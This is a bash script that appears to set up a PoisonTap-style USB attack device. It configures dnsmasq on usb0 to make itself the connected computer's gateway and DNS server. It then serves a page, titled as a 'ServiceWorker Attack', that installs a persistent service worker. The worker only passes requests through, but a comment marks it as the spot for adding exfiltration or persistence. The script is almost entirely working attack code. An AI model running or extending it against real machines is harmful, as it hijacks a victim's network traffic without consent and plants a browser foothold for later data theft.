#!/bin/bash

sudo ifconfig usb0 172.16.42.1 netmask 255.255.255.0 up
sudo systemctl stop dnsmasq || true
cat <<EOF | sudo tee /etc/dnsmasq.d/usb0.conf
interface=usb0
dhcp-range=172.16.42.10,172.16.42.50,255.255.255.0,12h
dhcp-option=3,172.16.42.1
dhcp-option=6,172.16.42.1
listen-address=172.16.42.1
EOF
sudo systemctl restart dnsmasq

sudo mkdir -p /srv/http
cat <<EOF | sudo tee /srv/http/index.html
<html>
  <body>
    <h1>PoisonTap ServiceWorker Attack</h1>
    <script>
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js').then(function(reg) {
            // Service worker registered
        });
      }
    </script>
    <p>Service worker should persist even after unplugging the device.</p>
  </body>
</html>
EOF

cat <<EOF | sudo tee /srv/http/sw.js
self.addEventListener('fetch', function(event) {
  event.respondWith(fetch(event.request));
  // Could inject further exfil or persistence here
});
EOF

cd /srv/http
sudo python3 -m http.server 80 &